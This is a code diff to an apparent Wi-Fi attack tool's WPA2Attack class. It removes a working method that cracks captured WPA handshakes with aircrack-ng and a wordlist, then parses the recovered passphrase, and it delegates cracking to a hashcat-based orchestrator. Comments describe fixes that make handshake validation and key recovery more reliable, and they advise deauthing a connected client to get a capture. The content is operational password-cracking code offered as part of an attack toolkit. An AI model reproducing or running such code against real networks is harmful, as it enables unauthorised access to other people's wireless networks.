@@ -208,97 +208,18 @@ class WPA2Attack:
         return False
 
     def crack(self, capfile):
-        """Crack handshake with wordlist — streams aircrack-ng output live"""
-        import re
+        """Crack handshake — delegates to CrackOrchestrator.
 
-        if not self.wordlist:
-            return None
+        Kept for backward compatibility with AttackOrchestrator's flow.
+        The real cracking logic (hashcat, rules, masks, aircrack fallback)
+        lives in cracking.crack_orchestrator.
+        """
+        from cracking.crack_orchestrator import CrackOrchestrator, CrackConfig
 
-        if not os.path.exists(self.wordlist):
-            log.error(f"Wordlist not found: {self.wordlist}")
-            return None
-
-        # ── Pre-validate: confirm aircrack-ng sees a usable handshake ──────
-        #
-        # BUG 2 FIX: The previous pre-check used `-b BSSID` which makes
-        # aircrack-ng output "1 potential targets / Please specify a dictionary"
-        # regardless of whether a handshake exists — so "0 handshake" never
-        # appeared and the guard never fired.
-        #
-        # We now run WITHOUT -b so aircrack-ng prints the full BSSID table
-        # with explicit handshake counts: "WPA (0 handshake)" vs "WPA (1 handshake)".
-        pre = subprocess.run(
-            ["aircrack-ng", capfile],
-            capture_output=True, text=True, timeout=10
+        config = CrackConfig(
+            wordlist=self.wordlist,
+            bssid=self.target["bssid"],
         )
-        pre_out = pre.stdout + pre.stderr
-        if "0 handshake" in pre_out and "1 handshake" not in pre_out:
-            log.error("[!] No valid WPA handshake found in capture file.")
-            log.warn("    Handshake requires a connected client to be deauthed and reconnect.")
-            log.warn("    → Connect a device to the network, then capture again.")
-            return None
+        orchestrator = CrackOrchestrator(config)
+        return orchestrator.crack(capfile)
 
-        wl_lines = sum(1 for _ in open(self.wordlist, "rb"))
-        log.info(f"Cracking with aircrack-ng + {self.wordlist} ({wl_lines:,} passwords)...")
-        log.info("[*] This may take several minutes. Press Ctrl+C to stop early.")
-
-        cmd = [
-            "aircrack-ng", capfile,
-            "-w", self.wordlist,
-            "-b", self.target["bssid"],
-            "-q",   # suppress curses TUI — gives plain line output
-        ]
-
-        proc = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1
-        )
-
-        found = None
-        try:
-            for raw in proc.stdout:
-                line = raw.rstrip()
-                if not line:
-                    continue
-
-                if "KEY FOUND" in line:
-                    match = re.search(r'KEY FOUND! \[ (.+?) \]', line)
-                    if match:
-                        found = match.group(1)
-                    break
-
-                elif "Passphrase not in dictionary" in line or "Failed. Next" in line:
-                    print()
-                    log.warn("[!] Password not in wordlist — try a different wordlist.")
-                    break
-
-                elif "No valid WPA handshakes found" in line:
-                    print()
-                    log.error("[!] No valid WPA handshake — capture a fresh handshake first.")
-                    break
-
-                # BUG 3 FIX: aircrack-ng exits with this when cap has no EAPOL
-                elif "Packets contained no EAPOL data" in line:
-                    print()
-                    log.error("[!] Capture contains no EAPOL frames — handshake was not captured.")
-                    log.warn("    → Ensure a client is connected to the AP, then run again.")
-                    break
-
-                elif re.search(r'\d+/\d+|keys tested|\d+\.\d+\s*k/s', line, re.I):
-                    print(f"\r   {line.strip():<70}", end="", flush=True)
-
-        except KeyboardInterrupt:
-            proc.terminate()
-            print()
-            log.warn("[!] Cracking stopped by user.")
-        finally:
-            try:
-                proc.wait(timeout=5)
-            except Exception:
-                proc.kill()
-            print()
-
-        return found
